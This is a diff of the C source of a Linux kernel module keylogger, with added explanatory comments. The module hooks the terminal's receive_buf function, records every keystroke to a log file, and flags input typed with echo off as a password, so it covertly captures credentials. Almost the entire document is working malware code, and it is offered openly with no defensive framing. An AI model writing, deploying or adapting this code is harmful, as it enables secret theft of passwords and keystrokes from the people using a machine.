@@ -4,7 +4,7 @@
 #include <linux/errno.h> // not too sure about this
 #include <linux/unistd.h> // we're messing with syscalls
 #include <linux/syscalls.h> // same as above
-#include <linux/slab.h>
+#include <linux/slab.h> // dynamic memory allocation
 #include <linux/tty.h>
 #include <linux/fs.h>
 #include "headers/kfile.h" // file operations
@@ -26,7 +26,9 @@ struct file* logfile;
 
 // a struct to hold our chars
 struct logger {
+  // position in the buffer
   int pos;
+  // the actual buffer.
   char buf[MAX_BUFFER + MAX_SPECIAL_CHAR_SIZE];
 };
 
@@ -34,7 +36,10 @@ struct logger {
 struct logger* logger;
 
 // functions for our logging, aka appending and resetting
+// source = the source char buffer we are grabbing
+// count = the number of bytes we're writing
 void append_c(char* source, size_t count){
+  // only log if we won't overflow the buffer
   if((logger->pos + count) > (MAX_BUFFER + MAX_SPECIAL_CHAR_SIZE)){
     // prevent overflow
     return;
@@ -43,16 +48,25 @@ void append_c(char* source, size_t count){
   strncat(logger->buf,source,count);
   logger->pos += count;
 }
+
+// empties the logger by writing all zeroes into it
 void reset_logger(){
+  // reset our position to 0
   logger->pos = 0;
   int i;
   for(i = 0;i < MAX_BUFFER + MAX_SPECIAL_CHAR_SIZE;i++){
+    // write 0 into each char in the buffer
     logger->buf[i] = 0;
   }
 }
 
 // handles all possible single char characters
+// cp = char pointer we are looking at
 void handle_single_char(char* cp){
+
+  // this handles single characters, so it's safe to assume
+  // that we only need to look at cp[0]
+  // for each case, log a different string into the file
   switch(cp[0]){
   case 0x01:	//^A
     append_c("[^A]", 4);
@@ -139,36 +153,42 @@ void handle_single_char(char* cp){
     append_c("[ESC]", 5);
     break;
   default:
+    // just log the key, it's nothing special
     append_c((char*)cp,1);
   }
 }
 
 // handles special characters
+// as of now, it is not implemented
 void handle_special_char(char* cp, size_t count){
+  // empty function
 }
 // pointer to the old receive_buf function
+// we need this so we can restore the tty when the module exits
 void (*old_receive_buf)(struct tty_struct*,const unsigned char*,
 			char*,int);
 
-// our replacement receive_buf
+// our replacement receive_buf. Uses the same parameters and return
+// type of the old receive_buf, only this time we actually log
 void new_receive_buf(struct tty_struct* tty, const unsigned char* cp,
 		     char* fp, int count){
 
-  // ignore raw mode
+  // ignore raw mode. The tty has bits to check
+  // for this
   if(!tty->raw && !tty->real_raw){
-    //if(L_ICANON(tty) && !L_ECHO(tty)) to check for passwd prompts
     // if we have a single character
     if(count == 1){
       // check if it's the backspace char
       if(cp[0] == BACKSPACE_1 ||
 	 cp[0] == BACKSPACE_2){
+	// delete a char from our buffer, but
 	// make sure we will remain in the buffer
 	if(logger->pos){
 	  logger->pos--;
 	  logger->buf[logger->pos] = 0;
 	}
       }else{
-	// otherwise, add the char
+	// otherwise, add the char to our log
 	handle_single_char((char*)cp);
 
 	// check if the user pressed enter
@@ -177,7 +197,9 @@ void new_receive_buf(struct tty_struct* tty, const unsigned char* cp,
 	  // write our current log to our buffer
 	  kwrite(logfile,0,logger->buf,logger->pos);
 
-	  // if this is a password
+	  // if this is a password. These are macros provided
+	  // by the kernel. If echoing is turned off, we can
+	  // assume that the tty is expecting a password
 	  if(L_ICANON(tty) && !L_ECHO(tty)){
 	    kwrite(logfile,0,"--(the above is a password)--\n",30);
 	  }
@@ -187,14 +209,23 @@ void new_receive_buf(struct tty_struct* tty, const unsigned char* cp,
       }
     }
   }
-  // call the old function
+  // call the old function so the kernel can execute normally
   old_receive_buf(tty,cp,fp,count);
 }
+
+// our init function. It runs when the module is first loaded.
+// we grab the old tty receive_buf function and replace it
+// with our own
 static int init(void) {
-  // our structs
+  // our structs for opening the main tty
+
+  // initialize our function pointers to avoid junk pointers
   struct tty_struct* tty = NULL;
   struct file* file = NULL;
   logfile = NULL;
+
+  // the name of the main tty. This shouldn't change in 
+  // different installations
   char* dev_name = "/dev/tty";
 
   // open the tty
@@ -203,38 +234,56 @@ static int init(void) {
   logfile = kopen(LF_PATH,LF_FLAGS,LF_PERMS);
 
   // init out log file
+  // the message is just to help read the log file
   char* init_message = "-----beginning of log entry-----\n";
+
+  // write to the log file only if it was initialized correctly
   if(logfile) kwrite(logfile,0,init_message,33);
 
+  // open the file only if it was initialized correctly
   if(file){
-    // we got a tty, so lets init our logger
+    // our file opened, so begin initalize our tlogger struct
     logger = NULL;
+    // allocate memory for it
     logger = (struct logger*)kmalloc(sizeof(struct logger),GFP_KERNEL);
+    // clear any junk memory that may be inside it
     reset_logger();
 
-    // grab the tty from the file
+    // grab the tty from the file. we must get the file's
+    // private data, which contains a pointer to the tty
     struct tty_file_private* priv = NULL;
     priv = file->private_data;
     if(priv) tty=priv->tty;
+
+    // if we successfully got our tty
     if(tty){
+
+      // check if it actually has the receive_buf function.
+      // you never know
       if(tty->ldisc->ops->receive_buf){
-	//change the old receive_buf
+	//store this function into our old_receive_buf
 	old_receive_buf = tty->ldisc->ops->receive_buf;
+	//replace the tty's function with our own function
 	tty->ldisc->ops->receive_buf = new_receive_buf;
       }
     }
   }
+
+  // close the file, we're done with it
   kclose(file);
   return 0;
 }
-	 
+
+// exit method. Runs when the module is exited.
+// we must free our logger and restore the tty's 
+// receive_buf function
 static void exit(void) {
   // close our log file
   char* exit_message = "-----end of log entry-----\n";
   if(logfile) kwrite(logfile,0,exit_message,27);
   if(logfile) kclose(logfile);
 
-  // our structs
+  // create our structs again
   struct tty_struct* tty = NULL;
   struct file* file = NULL;
   char* dev_name = "/dev/tty";
@@ -244,9 +293,12 @@ static void exit(void) {
   if(file){
     // free our logger
     kfree(logger);
+
+    // get the tty
     struct tty_file_private* priv = NULL;
     priv = file->private_data;
     if(priv) tty=priv->tty;
+
     if(tty){
       if(tty->ldisc->ops->receive_buf){
 	//restore the receive_buf function
